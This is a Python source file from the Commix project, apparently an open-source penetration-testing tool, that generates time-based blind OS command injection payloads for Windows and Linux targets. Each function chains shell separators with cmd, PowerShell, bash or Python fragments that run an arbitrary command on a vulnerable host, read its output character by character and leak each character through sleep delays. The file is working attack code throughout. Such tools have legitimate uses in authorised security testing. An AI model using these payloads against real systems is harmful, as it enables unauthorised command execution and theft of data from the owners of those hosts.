#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

from src.thirdparty.six.moves import urllib as _urllib
from src.utils import settings

"""
The "time-based" injection technique on Blind OS Command Injection.
The available "time-based" payloads.
"""

"""
Time-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand +  
                 "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write '" + TAG + "'.length\"') "
                 "do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                 "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else:
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 "str=$(echo " + TAG + ")" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi"
                 )


    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "sleep 0 " + separator + 
                 "str=$(echo " + TAG + ")" + separator + 
                 # Find the length of the output.
                 "str1=$(expr length \"$str\")" + separator +
                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                 "sleep " + str(timesec)
                 )
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(output_length) + " -ne $(echo " + TAG + settings.SINGLE_WHITESPACE + 
                 pipe + "tr -d '\\n' " + pipe + "wc -c) ] " + separator + 
                 "sleep " + str(timesec)
                 )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +  
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                python_payload +
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )
  else:  
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
                 # Find the length of the output, using readline().
                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\")" + separator + 
                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\") ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
        
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE + 
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else: 
    settings.USER_SUPPLIED_CMD = cmd
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 "str=\"$(echo $(" + cmd + "))\"" + separator + 
                 #"str1=${%23str}" + separator + 
                 "str1=$(expr length \"$str\")" + separator +
                 "if [ " + str(output_length) + " -ne $str1 ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "sleep 0" + separator + 
                 "str=$(echo $(" + cmd + "))" + separator +
                 # Find the length of the output.
                 "str1=$(expr length $str)" + separator +
                 #"str1=${%23str}  " + separator + 
                 "[ " + str(output_length) + " -eq $str1 ]" + separator + 
                 "sleep " + str(timesec)
                 )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)
        
    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " +str(output_length)+ " -ne $(echo -n \"$(" + cmd + ")\" " + 
                 pipe + "tr -d '\\n'  " + pipe + "wc -c) ] " + separator +  
                 "sleep " + str(timesec)
                 )
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )
    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" + str(output_length) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )
  else: 
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 # Find the length of the output, using readline().
                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator + 
                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + separator + 
                 # Find the length of the output, using readline().
                 "str1=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\")" + separator + 
                 "[ " + str(output_length) + " -eq ${str1} ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\") "
                 )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 # Find the length of the output, using readline().
                 "[ " + str(output_length) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'$(echo $(" + cmd + "))\'))\") ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 ) 
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload
"""
Get the execution output, of shell execution.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                "for /f \"tokens=*\" %i in ('cmd /c \"powershell.exe -InputFormat none write ([int][char](([string](cmd /c " +
                cmd + ")).trim()).substring(" + str(num_of_chars-1) + ",1))\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else: 
    settings.USER_SUPPLIED_CMD = cmd
    if separator == ";" or separator == "%0a" :
      payload = (separator + 
                # Grab the execution output.
                "cmd=\"$(echo $(" + cmd + "))\"" + separator +       
                # Export char-by-char the execution output.
                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                # Transform from Ascii to Decimal.
                "str=$(printf '%d' \"'$char'\")" + separator +
                # Perform the time-based comparisons
                "if [ " + str(ascii_char) + " -ne $str ]" + separator +
                "then sleep 0" + separator +
                "else sleep " + str(timesec) + separator +
                "fi "
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                "sleep 0 " + separator + 
                # Grab the execution output.
                "cmd=\"$(echo $(" + cmd + "))\"" + separator + 
                # Export char-by-char the execution output.
                "char=$(expr substr \"$cmd\" " + str(num_of_chars) + " 1)" + separator + 
                # Transform from Ascii to Decimal.
                "str=$(printf '%d' \"'$char'\")" + separator +
                # Perform the time-based comparisons
                "[ " + str(ascii_char) + " -eq ${str} ] " + separator + 
                "sleep " + str(timesec)
                )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                "[ " + str(ascii_char) + " -ne $(" + cmd + pipe + "tr -d '\\n'" + 
                pipe + "cut -c " + str(num_of_chars) + pipe + "od -N 1 -i" + 
                pipe + "head -1" + pipe + "awk '{print$2}') ] " + separator + 
                "sleep " + str(timesec)
                )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE +  
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE + 
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE +   
                "for /f \"tokens=*\" %i in ('cmd /c " + 
                python_payload +
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE + 
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                
                )
  else: 
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator +
                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator + 
                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\")" + separator + 
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'$(echo $(" + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\") ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload

"""
Get the execution output, of shell execution.
"""
def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c \"" +
                cmd + 
                "\"') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +  
                "cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(2 * timesec + 1) + "\""
                )

  else:
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 "str=\"$(" + cmd + ")\"" + separator + 
                 "if [ " + str(ascii_char) + " -ne $str ]" + separator + 
                 "then sleep 0" + separator + 
                 "else sleep " + str(timesec) + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "sleep 0 " + separator + 
                 "str=\"$(" + cmd + ")\" " + separator + 
                 "[ " + str(ascii_char) + " -eq $str ] " + separator + 
                 "sleep " + str(timesec)
                 )
      
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne \"$(" + cmd + ")\" ] " + separator + 
                 "sleep " + str(timesec)
                 )  
    else:
      pass

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
  if settings.TARGET_OS == "win":
    if separator == "|" or separator == "||" :
      pipe = "|"
      payload = (pipe + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + settings.SINGLE_WHITESPACE + 
                "for /f \"tokens=*\" %i in ('cmd /c " +
                cmd + 
                "') do if %i==" + str(ascii_char) + settings.SINGLE_WHITESPACE +
                "cmd /c " + settings.WIN_PYTHON_INTERPRETER + " -c \"import time; time.sleep(" + str(2 * timesec + 1) + ")\""
                )
  else: 
    if separator == ";" or separator == "%0a":
      payload = (separator + 
                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator +
                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
                 "then $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\")" + separator + 
                 "else $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")" + separator + 
                 "fi "
                 )

    elif separator == "&&" :
      separator = _urllib.parse.quote(separator)
      ampersand = _urllib.parse.quote("&")
      payload = (ampersand + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " +  separator + 
                 "str=$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\")" + separator + 
                 "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      #if menu.options.data:
      separator = _urllib.parse.unquote(separator)

    elif separator == "||" :
      pipe = "|"
      payload = (pipe +
                 "[ " + str(ascii_char) + " -ne $(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"print($(echo $(" + cmd + ")))\n\") ] " + separator + 
                 "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\") " + pipe + "$(" + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + ")\")"
                 )
      
    else:
      pass

    # New line fixation
    if settings.USER_AGENT_INJECTION == True or \
       settings.REFERER_INJECTION == True or \
       settings.HOST_INJECTION == True or \
       settings.CUSTOM_HEADER_INJECTION == True:
      payload = payload.replace("\n",";")
    else:
      if settings.TARGET_OS != "win":
        payload = payload.replace("\n","%0d")
  return payload
# eof